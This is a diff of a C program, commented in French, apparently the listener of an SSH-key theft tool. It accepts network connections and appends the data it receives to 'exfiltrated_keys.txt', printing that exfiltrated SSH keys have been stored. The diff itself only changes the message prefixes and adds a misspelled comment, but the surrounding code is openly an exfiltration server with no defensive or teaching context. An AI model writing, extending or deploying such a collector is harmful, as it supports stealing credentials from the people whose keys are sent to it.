@@ -21,12 +21,12 @@ int main() {
     bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
     listen(server_sock, 5);
 
-    printf("[+] Serveur d'exfiltration en attente sur le port %d...\n", PORT);
-
+    printf(">> Serveur d'exfiltration en attente sur le port %d...\n", PORT);
+// boucliere infinie pour accepter les connexions
     while (1) {
         addr_size = sizeof(client_addr);
         client_sock = accept(server_sock, (struct sockaddr*)&client_addr, &addr_size);
-        printf("[+] Connexion reçue de %s\n", inet_ntoa(client_addr.sin_addr));
+        printf(">> Connexion reçue de %s\n", inet_ntoa(client_addr.sin_addr));
 
         FILE *logfile = fopen("exfiltrated_keys.txt", "a");
         if (!logfile) {
@@ -40,7 +40,7 @@ int main() {
             fwrite(buffer, 1, bytes_received, logfile);
         }
 
-        printf("[+] Clés SSH exfiltrées enregistrées.\n");
+        printf(">> Clés SSH exfiltrées enregistrées.\n");
         fclose(logfile);
         close(client_sock);
     }
